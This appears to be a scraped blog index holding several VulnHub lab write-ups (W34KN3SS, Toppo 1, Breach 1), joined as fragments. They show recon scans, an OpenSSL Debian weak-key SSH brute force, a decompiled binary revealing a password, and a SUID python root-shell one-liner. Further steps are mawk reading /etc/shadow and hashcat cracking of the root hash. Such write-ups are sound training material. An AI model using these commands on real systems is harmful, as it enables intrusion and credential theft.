Extract ┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit] └─# tar -xvf 5622.tar.bz2 rsa/2048/2c39076a750679c89ed30581f3371a03-21786.pub rsa/2048/34602375d32e68ab98b48ab008a1d0f9-8985 rsa/2048/b009a4aaa5deae5f11c66a26d0a42de6-11400.pub ... Execute python script ┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit] └─# python 5720.py -OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org ./exploit.py &amp;lt;dir&amp;gt; &amp;lt;host&amp;gt; &amp;lt;user&amp;gt; [[port] [threads]] &amp;lt;dir&amp;gt;: Path to SSH privatekeys (ex. /home/john/keys) without final slash &amp;lt;host&amp;gt;: The victim host &amp;lt;user&amp;gt;: The user of the victim host [port]: The SSH port of the victim host (default 22) [threads]: Number of threads (default 4) Too big numer is bad ┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit/openssl-0.9.8c-1] └─# python 5720.py rsa/2048/ 192.168.236.9 n30 22 5 -OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org Tested 202 keys | Remaining 32566 keys | Aprox. Speed 40/sec Key Found in file: 4161de56829de2fe64b9055711f531c1-2537 Execute: ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.236.9 Tested 280 keys | Remaining 32488 keys | Aprox. Speed 15/sec - Found key `4161de56829de2fe64b9055711f531c1-2537` ![](images/Pasted%20image%2020220124202456.png) ## TCP/22 (SSH) SSH w/ 4161de56829de2fe64b9055711f531c1-2537 ┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit/openssl-0.9.8c-1] └─# ssh -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 n30@$ip Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1 n30@W34KN3SS:~$ User Flag n30@W34KN3SS:~$ cat user.txt 25e3cd678875b601425c9356c8039f68 n30@W34KN3SS:~$ Privilege EscalationRoot - Via Decompiling Python Binary + Sudo View n30 home directory n30@W34KN3SS:~$ ls -la total 44 drwxr-xr-x 5 n30 n30 4096 Aug 14 2018 . drwxr-xr-x 3 root root 4096 May 5 2018 .. -rw------- 1 n30 n30 25 Aug 14 2018 .bash_history -rw-r--r-- 1 n30 n30 220 May 5 2018 .bash_logout -rw-r--r-- 1 n30 n30 3771 May 5 2018 .bashrc drwx------ 2 n30 n30 4096 May 5 2018 .cache -rwxrwxr-x 1 n30 n30 1138 May 8 2018 code drwxrwxr-x 3 n30 n30 4096 May 5 2018 .local -rw-r--r-- 1 n30 n30 818 May 7 2018 .profile drwxrwxr-x 2 n30 n30 4096 May 5 2018 .ssh -rw-r--r-- 1 n30 n30 0 May 5 2018 .sudo_as_admin_successful -rw-rw-r-- 1 n30 n30 33 May 8 2018 user.txt .sudo_as_admin_successful n30 has a sudoers entry code See what it does n30@W34KN3SS:~$ file code code: python 2.7 byte-compiled n30@W34KN3SS:~$ python code [+]System Started at : Mon Jan 24 22:32:16 2022 [+]This binary should generate unique hash for the hardcoded login info [+]Generating the hash .. [+]Your new hash is : 5e335c58fc4a146c0e4716472a34fb79a5c1515c1ea9e77e30d3ec5d172d268f [+]Done n30@W34KN3SS:~$ python2.7 byte-compiled raw-sha256 (1400) Crack hash Failed to crack Transfer code to kali Decompile code binary mv code code.pyc ┌──(uncompyle6)(root💀kali)-[~/tools/uncompyle6] └─# uncompyle6 -o compiled.py /root/vulnHub/W34KN3SS/192.168.236.9/loot/code ┌──(uncompyle6)(root💀kali)-[~/tools/uncompyle6] └─# cat compiled.py # uncompyle6 version 3.8.0 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.18 (default, Sep 24 2021, 09:39:51) # [GCC 10.3.0] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: code.py # Compiled at: 2018-05-08 23:50:54 import os, socket, time, hashlib print (&#39;[+]System Started at : {0}&#39;).format(time.ctime()) print &#39;[+]This binary should generate unique hash for the hardcoded login info&#39; print &#39;[+]Generating the hash ..&#39; inf = &#39;&#39; inf += chr(ord(&#39;n&#39;)) inf += chr(ord(&#39;3&#39;)) inf += chr(ord(&#39;0&#39;)) inf += chr(ord(&#39;:&#39;)) inf += chr(ord(&#39;d&#39;)) inf += chr(ord(&#39;M&#39;)) inf += chr(ord(&#39;A&#39;)) inf += chr(ord(&#39;S&#39;)) inf += chr(ord(&#39;D&#39;)) inf += chr(ord(&#39;N&#39;)) inf += chr(ord(&#39;B&#39;)) inf += chr(ord(&#39;!&#39;)) inf += chr(ord(&#39;!&#39;)) inf += chr(ord(&#39;#&#39;)) inf += chr(ord(&#39;B&#39;)) inf += chr(ord(&#39;!&#39;)) inf += chr(ord(&#39;#&#39;)) inf += chr(ord(&#39;!&#39;)) inf += chr(ord(&#39;#&#39;)) inf += chr(ord(&#39;3&#39;)) inf += chr(ord(&#39;3&#39;)) hashf = hashlib.sha256(inf + time.ctime()).hexdigest() print (&#39;[+]Your new hash is : {0}&#39;).format(hashf) print &#39;[+]Done&#39; n30:dMASDNB!!#B!#!#33 Check sudo access n30@W34KN3SS:~$ sudo -l [sudo] password for n30: dMASDNB!!#B!#!#33 Matching Defaults entries for n30 on W34KN3SS: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin Switch to root User n30 may run the following commands on W34KN3SS: (ALL : ALL) ALL n30@W34KN3SS:~$ sudo su root@W34KN3SS:/home/n30# whoami root root@W34KN3SS:/home/n30# Root flag root@W34KN3SS:/home/n30# cd /root root@W34KN3SS:~# ls root.txt root@W34KN3SS:~# cat root.txt a1d2fab76ec6af9b651d4053171e042e root@W34KN3SS:~# " }, { "title": "Vulnhub - Toppo 1", "url": "/posts/Toppo-1/", "categories": "Vulnhub, Linux", "tags": "linux-priv-esc/suid/gtfo-bin", "date": "2022-01-26 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sat Jan 29 00:48:25 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Toppo-1/192.168.110.6/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Toppo-1/192.168.110.6/scans/xml/_full_tcp_nmap.xml 192.168.110.6mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversadjust_timeouts2: packet supposedly had rtt of -529683 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -529683 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -176415 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -176415 microseconds. Ignoring time.Nmap scan report for 192.168.110.6Host is up, received arp-response (0.00080s latency).Scanned at 2022-01-29 00:48:27 +08 for 19sNot shown: 65531 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)| ssh-dss AAAAB3NzaC1kc3MAAACBAMXeIQqeVVpxMNAkY4RTRcy1D29rxJsEteFBLHjNfezXeIK+LmbYWt1lJXfXjwXo1dwe6BjA388IYcnKnFu7FPshuDGA/H/MNj2o0JaVoiS4e0VONX5NTENh/a+lScGKcbpvi5sxRhL110w8lrdZYK6taXKUbYnDAl1BpCHdb+DfAAAAFQCMbk+1pL8kAIa/FTuxO9IuWf6/lwAAAIAmyFHznKAwdtfCNLaSzFWL/LNzBcTPytb7RMvhcIMKAkS/2IfnPIHdQmni7IFpq4CaLMjiVHTBvZQCSIYulIrXcpoGxLuZ3tPR0NS89AySdoOT/7ngs5AKx3nSVJqdomRzQ8Pjxs1VxadVE645hUir2lidBD2vZRDO5Pw3yT1BfgAAAIAW5d6lONexLVvMCH7t6AtmCDA6+R+5Eq6WtdA/XZ4e/cAKU2sSnrgd35imo4Jp8fYJEVBdIBqhrjjW0Pr7TZeWg/4hgsS5ZunhQG1mNmpgud28VveZfZaoxwudeylbfCHg4InYeE2aUrAlTOIw/pKMyWpqRniNuA5QMHPPIO+GVg==| 2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNiyFG4Uk84D3XUAN77szM4dkXvd6vOcyUKW3BARbCZFJQnGWqCBV6P0aR+Prs7Cx2+CVUeubbB2BFVQ6r4geCCNYV191XRdGPFFHlchAsfyhIJ1oLQYCAWxhWU6N2fYDcMwWVAlFHtgTXb5nmDFCz2dHHr9yUdzuOvXKHOgc4BFX8GP9dgmjkNPi8joLxowHuGiTcUlSsLU7sph9TrLV6j/TGqN3scrr1upMn6Vpv8/xA2zBYVU/jGVu/MyaaCEOL+WSXm58mKVBNnuPbBxatKRXUKebZDY7s+yLq0OPndwxxShfg7kHnaFF5Qbdan7a3UiR8RWHkpkbrVHuiwebx| 256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMGp55PVlF8Zt+uCcJjrAwbxX1WX6i/CcFYGh8lQHmwJWaQq8SqLkdfdyvlOOj7VSOw6NA82BiLSAfGI0s95Ig=| 256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKG70nQU/kKxR0rcoe6hx38OEpmSQ08IHLqqkXQgSIfi80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))|_http-title: Clean Blog - Start Bootstrap Theme| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.10 (Debian)111/tcp open rpcbind syn-ack ttl 64 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 35146/udp6 status| 100024 1 48791/tcp status| 100024 1 51294/tcp6 status|_ 100024 1 57711/udp status48791/tcp open status syn-ack ttl 64 1 (RPC #100024)MAC Address: 08:00:27:7C:34:70 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/29%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61FOS:41E6E%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5BOS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 0.004 days (since Sat Jan 29 00:43:11 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=263 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.80 ms 192.168.110.6Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Jan 29 00:48:46 2022 -- 1 IP address (1 host up) scanned in 21.64 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Toppo-1]└─# ffuf -u http://192.168.110.6/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; -fw 22 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.6/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 22________________________________________________about.html [Status: 200, Size: 5030, Words: 1293, Lines: 130]admin [Status: 301, Size: 314, Words: 20, Lines: 10]contact.html [Status: 200, Size: 7016, Words: 1892, Lines: 170]css [Status: 301, Size: 312, Words: 20, Lines: 10]img [Status: 301, Size: 312, Words: 20, Lines: 10]index.html [Status: 200, Size: 6437, Words: 2028, Lines: 184]index.html [Status: 200, Size: 6437, Words: 2028, Lines: 184]js [Status: 301, Size: 311, Words: 20, Lines: 10]LICENSE [Status: 200, Size: 1093, Words: 156, Lines: 22]mail [Status: 301, Size: 313, Words: 20, Lines: 10]manual [Status: 301, Size: 315, Words: 20, Lines: 10]post.html [Status: 200, Size: 8262, Words: 2059, Lines: 168]vendor [Status: 301, Size: 315, Words: 20, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 363 req/sec :: Duration: [0:00:04] :: Errors: 0 :: admin mailNikto┌──(root💀kali)-[~/vulnHub/Toppo-1]└─# nikto -ask=no -h http://192.168.110.6:80 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Toppo-1/192.168.110.6/scans/tcp80/tcp_80_http_nikto.txt&quot;- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.110.6+ Target Hostname: 192.168.110.6+ Target Port: 80+ Start Time: 2022-01-29 01:29:32 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.10 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Server may leak inodes via ETags, header found with file /, inode: 1925, size: 563f5cf714e80, mtime: gzip+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + OSVDB-3268: /admin/: Directory indexing found.+ OSVDB-3092: /admin/: This might be interesting...+ OSVDB-3268: /css/: Directory indexing found.+ OSVDB-3092: /css/: This might be interesting...+ OSVDB-3268: /img/: Directory indexing found.+ OSVDB-3092: /img/: This might be interesting...+ OSVDB-3268: /mail/: Directory indexing found.+ OSVDB-3092: /mail/: This might be interesting...+ OSVDB-3092: /manual/: Web server manual found.+ OSVDB-3268: /manual/images/: Directory indexing found.+ OSVDB-3233: /icons/README: Apache default file found.+ /package.json: Node.js package file found. It may contain sensitive information.+ 7915 requests: 0 error(s) and 18 item(s) reported on remote host+ End Time: 2022-01-29 01:30:25 (GMT8) (53 seconds)------------------------------------------------------------------------- package.jsonInitial FootholdTCP/80 (HTTP) - Rabbit Hole View enumerated directories admin notes.txt notes.txt ted? 12345ted123 package.json mail Detect LFI vulnerability at contact_me.php ┌───(root💀kali)-[~/vulnHub/Toppo-1] └─# ffuf -u http://192.168.110.6/mail/contact_me.php?W2:W1 -w /usr/share/wordlists/LFI/file_inclusion_linux.txt:W1 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:W2 -fw 3 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.6/mail/contact_me.php?W2:W1 :: Wordlist : W1: /usr/share/wordlists/LFI/file_inclusion_linux.txt :: Wordlist : W2: /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 3 ________________________________________________ :: Progress: [3103145/5820412] :: Job [1/1] :: 3972 req/sec :: Duration: [0:12:20] :: Errors: 0 Not susceptible to LFI At this point, I think TCP/80 is a rabbit holeTCP/22 (SSH) SSH with ted:12345ted123 Privilege EscalationRoot - Via SUID Binary (GTFO BIN) Enumerate SUID Binaries ted@Toppo:~$ find / -perm -4000 2&amp;gt;/dev/null /sbin/mount.nfs /usr/sbin/exim4 /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/python2.7 /usr/bin/chsh /usr/bin/at /usr/bin/mawk /usr/bin/chfn /usr/bin/procmail /usr/bin/passwd /bin/su /bin/umount /bin/mount python2.7 has a GTFOBins entry mawk also has a GTFOBins entry Exploit python2.7 to spawn a root shell /usr/bin/python2.7 -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39; Exploit mawk to read root’s hash LFILE=/etc/shadow ted@Toppo:~$ /usr/bin/mawk &#39;//&#39; &quot;$LFILE&quot; | grep root | cut -d &quot;:&quot; -f2 $6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0 Crack hash ┌──(root💀kali)-[~/vulnHub/Toppo-1] └─# hashcat -a 0 -m 1800 &#39;$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0&#39; /usr/share/wordlists/rockyou.txt --show $6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0:test123 root:test123 Root Flag # cd /root # ls flag.txt # cat f cat: f: No such file or directory # cat flag.txt _________ | _ _ | |_/ | | \\_|.--. _ .--. _ .--. .--. | | / .&#39;`\\ \\[ &#39;/&#39;`\\ \\[ &#39;/&#39;`\\ \\/ .&#39;`\\ \\ _| |_ | \\__. | | \\__/ | | \\__/ || \\__. | |_____| &#39;.__.&#39; | ;.__/ | ;.__/ &#39;.__.&#39; [__| [__| Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce} " }, { "title": "Vulnhub - Breach 1", "url": "/posts/Breach-1/", "categories": "Vulnhub, Linux", "tags": "tcp/80-http/cms/tomcat, image-forensics, linux-priv-esc/linux-creds-found", "date": "2022-01-24 00:00:00 +0800", "snippet": "ReconNMAP All ports are openTCP/80 (HTTP)Ferox - common.txt┌──(root💀kali)-[~/vulnHub/Breach1]└─# feroxbuster -u http://192.168.110.140 -w /usr/share/wordlists/dirb/common.txt -o /root/vulnHub/Breach1/192.168.110.140/scans/tcp80/ferox_common.txt ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓 ver: 2.4.1───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.110.140 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirb/common.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.4.1 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💾 Output File │ /root/vulnHub/Breach1/192.168.110.140/scans/tcp80/ferox_common.txt 🔃 Recursion Depth │ 4───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────403 10l 30w 291c http://192.168.110.140/.htpasswd403 10l 30w 286c http://192.168.110.140/.hta403 10l 30w 291c http://192.168.110.140/.htaccess301 9l 28w 318c http://192.168.110.140/images200 26l 147w 1098c http://192.168.110.140/index.html403 10l 30w 293c http://192.168.110.140/images/.hta403 10l 30w 298c http://192.168.110.140/images/.htpasswd403 10l 30w 298c http://192.168.110.140/images/.htaccess403 10l 30w 295c http://192.168.110.140/server-status[####################] - 2s 9226/9226 0s found:9 errors:1 [####################] - 1s 4613/4613 3772/s http://192.168.110.140[####################] - 1s 4613/4613 3726/s http://192.168.110.140/imagesFerox - directory-list-2.3-medium.txt┌──(root💀kali)-[~/vulnHub/Breach1]└─# feroxbuster -u http://192.168.110.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /root/vulnHub/Breach1/192.168.110.140/scans/tcp80/ferox_common.txt ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓 ver: 2.4.1───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.110.140 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.4.1 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💾 Output File │ /root/vulnHub/Breach1/192.168.110.140/scans/tcp80/ferox_common.txt 🔃 Recursion Depth │ 4───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────301 9l 28w 318c http://192.168.110.140/images403 10l 30w 295c http://192.168.110.140/server-status[####################] - 1m 441090/441090 0s found:2 errors:1 [####################] - 1m 220545/220545 2914/s http://192.168.110.140[####################] - 1m 220545/220545 2921/s http://192.168.110.140/imagesInitial AccessPort 80 (HTTP) - Obtain Wireshark File + Key Proceed to 192.168.110.140/index.html &amp;amp; View page source Encoded String initech.html Decode it ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http] └─# echo -n Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo | base64 -d | base64 -d pgibbons:damnitfeel$goodtobeagang$ta Encoded message is encoded by base64 twice. pgibbons:damnitfeel$goodtobeagang$ta Store username in a wordlist. Click on the image, redirected to initech.html Proceed to each panel Cake Stapler Employee Portal ImpressCMS Proceed to /images Download all images (including the ones found in impresscms) &amp;amp; analyze for any hidden objects ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http] └─# binwalk -eM *.jpg *.png Scan Time: 2022-01-20 01:24:04 Target File: /root/vulnHub/Breach1/192.168.110.140/loot/http/cake.jpg MD5 Checksum: bb59d999148563cb822ff71d58d87bdf Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION 0 0x0 JPEG image data, JFIF standard 1.01 Scan Time: 2022-01-20 01:24:04 Target File: /root/vulnHub/Breach1/192.168.110.140/loot/http/milton_beach.jpg MD5 Checksum: 762e138784121b3ff2dddfb4f6145939 Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION 0 0x0 JPEG image data, JFIF standard 1.01 30 0x1E TIFF image data, little-endian offset of first image directory: 8 Scan Time: 2022-01-20 01:24:04 Target File: /root/vulnHub/Breach1/192.168.110.140/loot/http/swingline.jpg MD5 Checksum: eb83c9619447471f6ece6a2be223380a Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION 0 0x0 JPEG image data, JFIF standard 1.02 412 0x19C Copyright string: &quot;Copyright (c) 1998 Hewlett-Packard Company&quot; Scan Time: 2022-01-20 05:36:56 Target File: /root/vulnHub/Breach1/192.168.110.140/loot/http/bill.png MD5 Checksum: 4b21e4a356b0caa990bf030ad9245c35 Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION 0 0x0 PNG image, 610 x 327, 8-bit/color RGBA, non-interlaced 41 0x29 Zlib compressed data, compressed Scan Time: 2022-01-20 05:36:56 Target File: /root/vulnHub/Breach1/192.168.110.140/loot/http/_bill.png.extracted/29 MD5 Checksum: d41d8cd98f00b204e9800998ecf8427e Signatures: 411 ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http] └─# exiftool *.jpg *.png | grep -i comment Comment : coffeestains bill.png: coffeestains Usually a password _bill.png.extracted, a false positive Managed to w/ pgibbons:damnitfeel$goodtobeagang$ta View inbox Posting sensitive content (Not useful) IDS/IPS system (Not useful) FWD: Thank you for purchase…. (Found something) .keystore file .keystore contains SSL cert? Able to decrypt SSL traffic if we have the cert. Proceed to Content Since we are unable to view the contents, search would work tried test, actually found something View “SSL implementation test capture” tomcat is set for alias, storepassword and keypassword _SSL_test_phase1.pcap file FUZZ search ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/exploit/impresscms]└─# ffuf -u &quot;http://192.168.110.140/impresscms/search.php?query=FUZZ&amp;amp;action=results&quot; -w /usr/share/wordlists/rockyou.txt -fw 753,758,748 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.140/impresscms/search.php?query=FUZZ&amp;amp;action=results :: Wordlist : FUZZ: /usr/share/wordlists/rockyou.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 753,758,748________________________________________________password [Status: 200, Size: 15492, Words: 926, Lines: 234]michael [Status: 200, Size: 15488, Words: 926, Lines: 234]PASSWORD [Status: 200, Size: 15490, Words: 926, Lines: 234]peter [Status: 200, Size: 15480, Words: 926, Lines: 234]fishing [Status: 200, Size: 15488, Words: 926, Lines: 234]Password [Status: 200, Size: 15490, Words: 926, Lines: 234]MICHAEL [Status: 200, Size: 15486, Words: 926, Lines: 234]Michael [Status: 200, Size: 15488, Words: 926, Lines: 234]access [Status: 200, Size: 15484, Words: 926, Lines: 234] Found another post w/ michael Search michael there could be more senstive items? Exporting SSL certificate/Key from Keystore Did some research Searched “How to extract ssl cert from keystore” https://stackoverflow.com/questions/23087537/how-to-export-key-and-crt-from-keystore/23087752 # Executed it, output says execute the following command instead which is industry standard: keytool -exportcert -keystore [keystore] -alias [alias] -file [cert_file] # Industry standard command: keytool -importkeystore -srckeystore [keystore] -destkeystore [target-keystore] -deststoretype PKCS12 Download _SSL_test_phase1.pcap ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http] └─# wget http://192.168.110.140/impresscms/_SSL_test_phase1.pcap --2022-01-20 03:00:10-- http://192.168.110.140/impresscms/_SSL_test_phase1.pcap Connecting to 192.168.110.140:80... connected. HTTP request sent, awaiting response... 200 OK Length: 41412 (40K) [application/vnd.tcpdump.pcap] Saving to: ‘_SSL_test_phase1.pcap’ _SSL_test_phase1.pcap 100%[==============================================&amp;gt;] 40.44K --.-KB/s in 0s 2022-01-20 03:00:10 (225 MB/s) - ‘_SSL_test_phase1.pcap’ saved [41412/41412] Download .keystore ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http] └─# wget 192.168.110.140/.keystore -O keystore --2022-01-20 03:01:57-- http://192.168.110.140/.keystore Connecting to 192.168.110.140:80... connected. HTTP request sent, awaiting response... 200 OK Length: 2245 (2.2K) Saving to: ‘keystore’ keystore 100%[==============================================&amp;gt;] 2.19K --.-KB/s in 0s 2022-01-20 03:01:57 (352 MB/s) - ‘keystore’ saved [2245/2245] Export SSL Certificate from keystore ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http] └─# keytool -importkeystore -srckeystore keystore -destkeystore ssl_cert -deststoretype PKCS12 Picked up 